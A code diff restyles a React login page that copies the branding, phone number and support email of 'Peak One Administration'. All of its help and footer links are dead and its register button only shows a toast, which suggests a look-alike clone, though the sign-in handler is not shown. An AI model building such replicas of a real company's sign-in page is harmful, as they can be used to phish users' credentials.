@@ -98,110 +98,77 @@ export default function LoginPage() {
     <>
       {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
       {showContent && (
-        <>
+        <div className="min-h-screen flex flex-col bg-white">
           <style>{`
-            *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
-            body{font-family:'Open Sans',Arial,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:14px;}
-            .topnav{background:#fff;border-bottom:1px solid #ddd;padding:8px 18px;display:flex;align-items:center;gap:24px;}
-            .peakone-logo{height:44px;width:auto;display:block;flex-shrink:0;}
-            .contact-block{display:flex;flex-direction:column;gap:2px;font-size:0.8rem;color:#444;}
-            .contact-row{display:flex;align-items:center;gap:6px;}
-            .contact-row svg{flex-shrink:0;color:#555;}
-            .nav-login-label{font-size:1.3rem;font-weight:300;color:#444;margin-left:4px;}
-            main{flex:1;display:flex;flex-direction:column;align-items:flex-start;padding:36px 20px 56px;padding-left:120px;}
-            .login-wrapper{width:100%;max-width:100%;display:flex;flex-direction:column;align-items:flex-start;gap:0;}
-            .lock-wrap{margin-bottom:12px;align-self:center;margin-top:0;}
-            .privacy-note{font-size:0.8125rem;color:#555;text-align:center;max-width:420px;line-height:1.55;margin-bottom:12px;margin-top:0;align-self:center;}
-            .signin-heading{font-size:1rem;font-weight:400;color:#333;margin-bottom:28px;margin-top:0;align-self:center;}
-            form{width:100%;max-width:420px;}
-            .field-group{margin-bottom:18px;}
-            .field-label{font-size:0.8125rem;color:#444;margin-bottom:5px;display:flex;align-items:center;gap:3px;}
-            .req{color:#e8a020;font-size:0.8rem;}
-            input[type="text"],input[type="password"]{width:100%;height:36px;border:1px solid #aaa;border-radius:2px;padding:0 10px;font-size:0.875rem;font-family:'Open Sans',sans-serif;color:#333;outline:none;background:#fff;transition:border-color 0.15s,box-shadow 0.15s;}
-            input[type="text"]:focus,input[type="password"]:focus{border-color:#8a7a4a;box-shadow:0 0 0 2px rgba(138,122,74,0.14);}
-            .field-group.has-error input{border-color:#c0392b;}
-            .field-help{font-size:0.75rem;color:#555;margin-top:5px;}
-            .field-help a{color:#1a6a9a;text-decoration:none;}
-            .field-help a:hover{text-decoration:underline;}
-            .err-msg{display:none;font-size:0.72rem;color:#c0392b;margin-top:4px;}
-            .field-group.has-error .err-msg{display:block;}
-            .btn-signin{background:#9a8650;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;margin-bottom:18px;transition:background 0.15s,transform 0.08s;}
+            *,*::before,*::after{box-sizing:border-box;}
+            .btn-signin{background:#9a8650;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;min-width:120px;transition:background 0.15s,transform 0.08s;}
             .btn-signin:hover{background:#7d6c40;}
             .btn-signin:active{transform:scale(0.99);}
             .btn-signin:disabled{opacity:0.65;cursor:not-allowed;}
             @keyframes spin{to{transform:rotate(360deg);}}
-            .spin-ring{display:none;width:14px;height:14px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin 0.65s linear infinite;}
-            .no-account-text{font-size:0.8rem;color:#555;margin-bottom:8px;}
-            .btn-register{background:#5a6378;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;transition:background 0.15s;}
+            .spin-ring{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin 0.65s linear infinite;}
+            .btn-register{background:#5a6378;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;min-width:120px;transition:background 0.15s;}
             .btn-register:hover{background:#424a5c;}
-            footer{background:#e0e0e0;padding:22px 20px 16px;text-align:center;}
-            .footer-links{display:flex;justify-content:center;gap:32px;margin-bottom:8px;}
-            .footer-links a{font-size:0.8125rem;color:#444;text-decoration:none;letter-spacing:0.04em;font-weight:600;text-transform:uppercase;}
-            .footer-links a:hover{text-decoration:underline;}
-            .footer-copy{font-size:0.72rem;color:#666;}
             #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(10px);background:#333;color:#fff;font-size:0.8rem;padding:9px 18px;border-radius:3px;opacity:0;pointer-events:none;transition:opacity 0.2s,transform 0.2s;z-index:9999;white-space:nowrap;}
             #toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
-            @media(max-width:700px){
-              .topnav{flex-direction:column;gap:12px;}
-              .nav-login-label{margin-left:0;}
-              main{padding:32px 16px 40px;padding-left:16px;align-items:center;}
-              .login-wrapper{align-items:center;}
-              .lock-wrap{max-width:none;width:100%;}
-              .signin-heading{max-width:none;width:100%;}
-              .privacy-note{max-width:none;width:100%;}
-            }
           `}</style>
-          <nav className="topnav">
-            <a href="#" onClick={(e) => e.preventDefault()}>
-              <img
-                className="peakone-logo"
-                src="/PeakOne-Logo-1.jpg"
-                alt="Peak One Administration"
-              />
-            </a>
-            <div className="contact-block">
-              <div className="contact-row">
-                <svg
-                  width="12"
-                  height="12"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <rect x="5" y="2" width="14" height="20" rx="2" />
-                  <line x1="12" y1="18" x2="12" y2="18" />
-                </svg>
-                866.315.1777
-              </div>
-              <div className="contact-row">
-                <svg
-                  width="12"
-                  height="12"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
-                  <polyline points="22,6 12,13 2,6" />
-                </svg>
-                membercare@peakoneadmin.com
-              </div>
-            </div>
-            <span className="nav-login-label">Login</span>
-          </nav>
-          <main>
-            <div className="login-wrapper">
-              <form id="login-form" onSubmit={handleSignIn}>
-                <div className="lock-wrap flex justify-center">
+
+          <header className="border-b border-gray-200 px-6 py-4 bg-white">
+            <div className="flex items-center">
+              <a href="#" onClick={(e) => e.preventDefault()} className="flex items-center shrink-0">
+                <img
+                  className="h-9 md:h-10 w-auto"
+                  src="/PeakOne-Logo-1.jpg"
+                  alt="Peak One Administration"
+                />
+              </a>
+              <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto md:ml-6 shrink-0">
+                <div className="flex items-center gap-1.5">
                   <svg
-                    width="44"
-                    height="44"
+                    width="12"
+                    height="12"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    className="shrink-0 text-gray-600"
+                  >
+                    <rect x="5" y="2" width="14" height="20" rx="2" />
+                    <line x1="12" y1="18" x2="12" y2="18" />
+                  </svg>
+                  <span>866.315.1777</span>
+                </div>
+                <div className="flex items-center gap-1.5 mt-1">
+                  <svg
+                    width="12"
+                    height="12"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    className="shrink-0 text-gray-600"
+                  >
+                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+                    <polyline points="22,6 12,13 2,6" />
+                  </svg>
+                  <span>membercare@peakoneadmin.com</span>
+                </div>
+              </div>
+              <span className="ml-6 text-xl text-gray-600 font-light hidden md:block">Login</span>
+            </div>
+          </header>
+
+          <main className="flex-1 flex flex-col items-center px-6 pt-4 md:pt-10 pb-8 lg:pr-[700px]">
+            <div className="w-full max-w-md">
+              <div className="flex justify-center mb-4">
+                <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
+                  <svg
+                    width="24"
+                    height="24"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="#555"
@@ -214,59 +181,75 @@ export default function LoginPage() {
                     <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
                   </svg>
                 </div>
+              </div>
 
-                <p className="privacy-note">
-                  We will maintain the confidentiality of your personal
-                  information in accordance with our privacy policy.
+              <p className="text-center text-gray-600 text-sm mb-4 leading-relaxed">
+                We will maintain the confidentiality of your personal information in accordance with our privacy policy.
+              </p>
+
+              <h1 className="text-center text-gray-800 text-2xl font-medium mb-5 tracking-tight">
+                Sign in
+              </h1>
+
+              {loginError && (
+                <p className="mb-4 text-sm text-red-600 whitespace-pre-line" role="alert">
+                  {loginError}
                 </p>
+              )}
 
-                <p className="signin-heading flex justify-center">Sign in</p>
-                <div className="field-group" id="fg-user">
-                  <div className="field-label">
-                    UserId <span className="req">*</span>
-                  </div>
+              <form id="login-form" onSubmit={handleSignIn} className="space-y-4">
+                <div className="space-y-1" id="fg-user">
+                  <label htmlFor="userid" className="text-sm font-medium text-gray-700 flex items-center gap-1">
+                    UserId <span className="text-orange-500">*</span>
+                  </label>
                   <input
                     type="text"
                     id="userid"
                     autoComplete="username"
                     value={username}
-                    onChange={(e) => setUsername(e.target.value)}
-                    onInput={() => {
-                      const el = document.getElementById("fg-user");
-                      if (el) el.classList.remove("has-error");
+                    onChange={(e) => {
+                      setUsername(e.target.value);
+                      if (loginError) setLoginError(null);
                     }}
+                    className="w-full h-10 px-3 border border-gray-300 rounded focus:border-[#9a8650] focus:ring-1 focus:ring-[#9a8650] outline-none text-sm text-gray-800 bg-white"
                   />
-                  <div className="field-help">
-                    Forgot your Username?{" "}
-                    <a href="#" onClick={(e) => e.preventDefault()}>
+                  <p className="text-sm mt-1">
+                    <span className="text-gray-600">Forgot your Username? </span>
+                    <a
+                      href="#"
+                      onClick={(e) => e.preventDefault()}
+                      className="text-blue-600 hover:text-blue-700 hover:underline"
+                    >
                       Let us help
                     </a>
-                  </div>
-                  <div className="err-msg">Please enter your User ID.</div>
+                  </p>
                 </div>
 
-                <div className="field-group" id="fg-pwd">
-                  <div className="field-label">
-                    Password <span className="req">*</span>
-                  </div>
+                <div className="space-y-1" id="fg-pwd">
+                  <label htmlFor="password" className="text-sm font-medium text-gray-700 flex items-center gap-1">
+                    Password <span className="text-orange-500">*</span>
+                  </label>
                   <input
                     type="password"
                     id="password"
                     autoComplete="current-password"
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    onInput={() => {
-                      const el = document.getElementById("fg-pwd");
-                      if (el) el.classList.remove("has-error");
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (loginError) setLoginError(null);
                     }}
+                    className="w-full h-10 px-3 border border-gray-300 rounded focus:border-[#9a8650] focus:ring-1 focus:ring-[#9a8650] outline-none text-sm text-gray-800 bg-white"
                   />
-                  <div className="field-help">
-                    Forgot your Password?{" "}
-                    <a href="#" onClick={(e) => e.preventDefault()}>
+                  <p className="text-sm mt-1">
+                    <span className="text-gray-600">Forgot your Password? </span>
+                    <a
+                      href="#"
+                      onClick={(e) => e.preventDefault()}
+                      className="text-blue-600 hover:text-blue-700 hover:underline"
+                    >
                       Let us help
                     </a>
-                  </div>
-                  <div className="err-msg">Please enter your Password.</div>
+                  </p>
                 </div>
 
                 <input
@@ -278,92 +261,94 @@ export default function LoginPage() {
                   autoComplete="off"
                 />
 
-                <button
-                  type="submit"
-                  className="btn-signin"
-                  id="signin-btn"
-                  disabled={isLoginLoading || !username || !password}
-                >
-                  <svg
-                    id="signin-check"
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="white"
-                    strokeWidth="3"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
+                <div className="flex justify-center md:justify-start">
+                  <button
+                    type="submit"
+                    className="btn-signin"
+                    id="signin-btn"
+                    disabled={isLoginLoading || !username || !password}
                   >
-                    <polyline points="20 6 9 17 4 12" />
-                  </svg>
-                  <div className="spin-ring" id="signin-spin"></div>
-                  <span id="signin-label">
-                    {isLoginLoading ? "Signing in…" : "SIGN IN"}
-                  </span>
-                </button>
+                    {isLoginLoading ? (
+                      <div className="spin-ring mr-2"></div>
+                    ) : (
+                      <svg
+                        id="signin-check"
+                        width="16"
+                        height="16"
+                        viewBox="0 0 24 24"
+                        fill="none"
+                        stroke="white"
+                        strokeWidth="3"
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        className="mr-2"
+                      >
+                        <polyline points="20 6 9 17 4 12" />
+                      </svg>
+                    )}
+                    <span id="signin-label">
+                      {isLoginLoading ? "Signing in…" : "SIGN IN"}
+                    </span>
+                  </button>
+                </div>
 
-                <p className="no-account-text">Don't have an account?</p>
-                <button
-                  type="button"
-                  className="btn-register"
-                  onClick={() => {
-                    const el = document.getElementById("toast");
-                    if (el) {
-                      el.textContent = "Opening registration…";
-                      el.classList.add("show");
-                      setTimeout(() => el.classList.remove("show"), 2800);
-                    }
-                  }}
-                >
-                  <svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="white"
-                    strokeWidth="2"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                  >
-                    <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
-                    <circle cx="9" cy="7" r="4" />
-                    <line x1="19" y1="8" x2="19" y2="14" />
-                    <line x1="22" y1="11" x2="16" y2="11" />
-                  </svg>
-                  REGISTER
-                </button>
-
-                {loginError && (
-                  <p
-                    style={{
-                      color: "#c0392b",
-                      marginTop: 8,
-                      fontSize: "0.75rem",
-                    }}
-                    aria-live="polite"
-                  >
-                    {loginError}
-                  </p>
-                )}
+                <div className="pt-4">
+                  <p className="text-gray-600 mb-2 text-sm text-left">Don't have an account?</p>
+                  <div className="flex justify-center md:justify-start">
+                    <button
+                      type="button"
+                      className="btn-register"
+                      onClick={() => {
+                        const el = document.getElementById("toast");
+                        if (el) {
+                          el.textContent = "Opening registration…";
+                          el.classList.add("show");
+                          setTimeout(() => el.classList.remove("show"), 2800);
+                        }
+                      }}
+                    >
+                      <svg
+                        width="16"
+                        height="16"
+                        viewBox="0 0 24 24"
+                        fill="none"
+                        stroke="white"
+                        strokeWidth="2"
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        className="mr-2"
+                      >
+                        <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
+                        <circle cx="9" cy="7" r="4" />
+                        <line x1="19" y1="8" x2="19" y2="14" />
+                        <line x1="22" y1="11" x2="16" y2="11" />
+                      </svg>
+                      REGISTER
+                    </button>
+                  </div>
+                </div>
               </form>
             </div>
           </main>
 
-          <footer>
-            <div className="footer-links">
-              <a href="#" onClick={(e) => e.preventDefault()}>
-                TERMS OF USE
-              </a>
-              <a href="#" onClick={(e) => e.preventDefault()}>
-                PRIVACY POLICY
-              </a>
+          <footer className="bg-[#e0e0e0] py-6 px-6">
+            <div className="max-w-7xl mx-auto">
+              <nav className="flex flex-wrap items-center justify-center gap-8 mb-3 text-xs md:text-sm tracking-wider font-semibold uppercase">
+                <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:text-gray-900 hover:underline">
+                  TERMS OF USE
+                </a>
+                <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:text-gray-900 hover:underline">
+                  PRIVACY POLICY
+                </a>
+              </nav>
+              <p className="text-center text-xs text-gray-600">
+                Copyright © 2017 Peak1 Administration LLC. All Rights Reserved.
+              </p>
             </div>
-            <p className="footer-copy">
-              Copyright © 2017 Peak1 Administration LLC. All Rights Reserved.
-            </p>
           </footer>
-        </>
+
+          <div id="toast">Opening registration…</div>
+        </div>
       )}
     </>
   );
